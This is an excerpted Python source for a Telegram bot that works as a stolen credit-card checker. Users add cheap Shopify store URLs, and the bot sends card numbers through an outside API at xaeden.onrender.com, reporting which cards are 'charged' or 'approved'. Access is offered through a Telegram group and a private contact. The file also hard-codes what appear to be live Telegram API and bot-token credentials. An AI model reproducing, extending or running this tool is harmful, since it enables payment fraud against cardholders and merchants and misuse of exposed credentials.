...
# Config
API_ID = 39901060
API_HASH = "e9f97ac381b21fc37148caca7494bd90"
BOT_TOKEN = "8205483485:AAHprLuUAG4vxYGgHtdw8FS0GsayxjxN_ls" # Replace with your Bot Token
ADMIN_ID = [8564010885] # Replace with your Admin ID(s)
GROUP_ID = -5155135961 # Replace with your Group ID
...
async def get_site_price(site_url):
    try:
        if not site_url.startswith('http'):
            site_url = f'https://{site_url}'
        # Using the same API to check price with a dummy card
        dummy_card = "4111111111111111|12|2025|123"
        url = f'https://xaeden.onrender.com/sh?cc={dummy_card}&url={site_url}'
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status == 200:
                    data = await res.json()
                    price_str = str(data.get('Price', '100'))
                    try:
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                ...
                if "Order completed" in api_response or "💎" in api_response:
                    ...
                    # Shopify gateway valid response check and site removal logic
                    valid_responses = ['3DS', 'OTP_REQUIRED', 'thank_you', 'order_comfirmed', 'charged', 'card_declined', 'insufficient_funds', 'order_placed', 'order placed', 'thank you', 'genetic_error']
                    response_lower = api_response.lower()
                    is_valid_response = False
                    for vr in valid_responses:
                        if vr.lower() in response_lower:
                            is_valid_response = True
                            break
                    
                    if not is_valid_response:
                        # If response is not valid, remove the site
                        sites_data = await load_json(SITE_FILE)
                        user_id_str = str(user_id)
                        if user_id_str in sites_data:
                            user_sites = sites_data[user_id_str]
                            original_site = selected_site.replace('https://', '').replace('http://', '')
                            # Try to find and remove the site from user's list
                            site_to_remove = next((s for s in user_sites if original_site in s), None)
                            if site_to_remove:
                                user_sites.remove(site_to_remove)
                                sites_data[user_id_str] = user_sites
                                await save_json(SITE_FILE, sites_data)
                                api_response = f"Site removed due to invalid response: {api_response}. Please check on another site."
...
def access_denied_message_with_button():
    ...
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+7x_7DZGSDCs1ZDBl")]]
...
async def add_site(event):
    ...
    try:
        ...
        added_sites = []
        already_exists = []
        checking_msg = await event.reply("🔍 Checking site prices (only <$20 allowed)...")
        for site in sites_to_add:
            if site in user_sites: already_exists.append(site)
                ...
                if price < 20.0:
                    ...
                    already_exists.append(f"{site} (Price too high: ${price})")
...
async def add_proxy(event):
    ...
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙩𝙤 𝙥𝙧𝙤𝙩𝙚𝙘𝙩 𝙮𝙤𝙪𝙧 𝙥??𝙤𝙭𝙮!")
...
async def sh(event):
    ...
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+7x_7DZGSDCs1ZDBl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙭𝘿_𝘼𝙣𝙠𝙞𝙩𝙩𝙩", buttons=buttons)
...
async def process_sh_card(event, access_type):
    ...
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙?? 𝙪𝙨𝙞𝙣𝙜 /𝙖𝙙𝙙")
    ...
    try:
        ...
        # Check for charged status
        is_charged = False
        if any(x in response_text for x in ["charged", "thank_you", "order_comfirmed", "order_placed", "order placed", "thank you"]) or "charged" in status_text:
...
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥??𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
...
async def check_sites(event):
    ...
    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+7x_7DZGSDCs1ZDBl")]
        ]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙭𝘿_𝘼𝙣𝙠𝙞𝙩𝙩𝙩", buttons=buttons)
